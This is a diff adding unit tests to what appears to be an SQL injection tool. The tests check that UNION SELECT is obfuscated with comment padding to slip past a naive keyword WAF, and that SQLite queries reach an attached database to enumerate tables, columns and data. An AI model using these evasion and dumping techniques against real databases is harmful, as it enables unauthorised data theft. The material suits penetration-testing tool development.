@@ -207,6 +207,30 @@ def test_union_walks_and_dumps_a_table():
     assert ["x1", "y1"] in rows and ["x2", "y2"] in rows
 
 
+def test_union_select_keyword_evades_a_naive_waf():
+    """UNION SELECT is spelled to slip a case-sensitive / whitespace keyword WAF — the
+    literal `UNION SELECT` never reaches the wire, but it still reads as union select."""
+    for _ in range(20):
+        us = sqli._union_select()
+        assert re.search(r"UNION\s+SELECT", us) is None         # a naive WAF wouldn't match
+        assert us.upper().replace("/**/", " ") == "UNION SELECT"    # but it IS union select
+
+
+def test_sqlite_cross_database_via_attach():
+    """SQLite reaches an ATTACHed database — cross-db is on, and the catalog/data queries
+    qualify and scope to it (archive.table, archive.sqlite_master, pragma schema arg)."""
+    assert sqli.cross_db_supported("sqlite")
+    assert sqli._qualify("sqlite", "archive", "secrets") == "archive.secrets"
+
+    p = sqli.scoped_profile(sqli._PROFILES["sqlite"], "sqlite", "archive")
+    assert "archive.sqlite_master" in p["table_at"]
+    assert "pragma_table_info('{t}','archive')" in p["col_at"]
+    assert p["cell_at"].startswith("(SELECT {c} FROM archive.{t}")
+
+    assert sqli._uscope("sqlite", "tables", "archive") == "name FROM archive.sqlite_master WHERE type='table'"
+    assert sqli._uscope("sqlite", "cols", "archive") == "name FROM pragma_table_info({t},'archive')"
+
+
 def _numeric_union_server():
     """A 3-column numeric injection (`SELECT id,name,role ... WHERE id={raw}`) whose
     out-of-range `ORDER BY` error page is *nearly identical* to a normal page — the
